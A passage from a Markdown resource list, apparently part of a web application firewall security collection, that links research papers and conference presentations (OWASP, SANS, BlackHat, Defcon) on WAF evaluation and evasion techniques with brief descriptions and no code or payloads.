- [Bypassing Web Application Firewalls with HTTP Parameter Pollution](papers/Bypassing%20Web%20Application%20Firewalls%20with%20HTTP%20Parameter%20Pollution.pdf) - A ressearch paper from [Exploit DB](https://exploit-db.com) about effectively bypassing WAFs via HTTP Parameter Pollution.
- [WAF Evasion Testing](papers/SANS%20Guide%20-%20WAF%20Evasion%20Testing.pdf) - A WAF evasion testing guide from [SANS](https://www.sans.org).
- [WASC WAF Evaluation Criteria](papers/WASC%20WAF%20Evaluation%20Criteria.pdf) - A guide for WAF Evaluation from [Web Application Security Consortium](http://www.webappsec.org)
- [WAF Evaluation and Analysis](papers/Web%20Application%20Firewalls%20-%20Evaluation%20and%20Analysis.pdf) - A paper about WAF evaluation and analysis of 2 most used WAFs (ModSecurity & WebKnight) from [University of Amsterdam](http://www.uva.nl).
- [Bypassing all WAF XSS Filters](papers/Evading%20All%20Web-Application%20Firewalls%20XSS%20Filters.pdf) - A paper about bypassing all XSS filter rules and evading WAFs for XSS.
- [Beyond SQLi - Obfuscate and Bypass WAFs](papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt) - A research paper from [Exploit Database](https://exploit-db.com) about obfuscating SQL injection queries to effectively bypass WAFs.

### Presentations:
- [WAF Profiling & Evasion Techniques](presentations/OWASP%20WAF%20Profiling%20&%20Evasion.pdf) - A WAF testing and evasion guide from [OWASP](https://www.owasp.org).
- [Protocol Level WAF Evasion Techniques](presentations/BlackHat%20US%2012%20-%20Protocol%20Level%20WAF%20Evasion%20(Slides).pdf) - A presentation at about efficiently evading WAFs at protocol level from [BlackHat US 12](https://www.blackhat.com/html/bh-us-12/).
- [Analysing Attacking Detection Logic Mechanisms](presentations/BlackHat%20US%2016%20-%20Analysis%20of%20Attack%20Detection%20Logic.pdf) - A presentation about WAF logic applied to detecting attacks from [BlackHat US 16](https://www.blackhat.com/html/bh-us-16/).
- [WAF Bypasses and PHP Exploits](presentations/WAF%20Bypasses%20and%20PHP%20Exploits%20(Slides).pdf) - A presentation about evading WAFs and developing related PHP exploits.
- [Playing Around with WAFs](presentations/Playing%20Around%20with%20WAFs.pdf) - A small presentation about WAF profiling and playing around with them from [Defcon 16](http://www.defcon.org/html/defcon-16/dc-16-post.html).
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTgwNDI2NTY1OF19
-->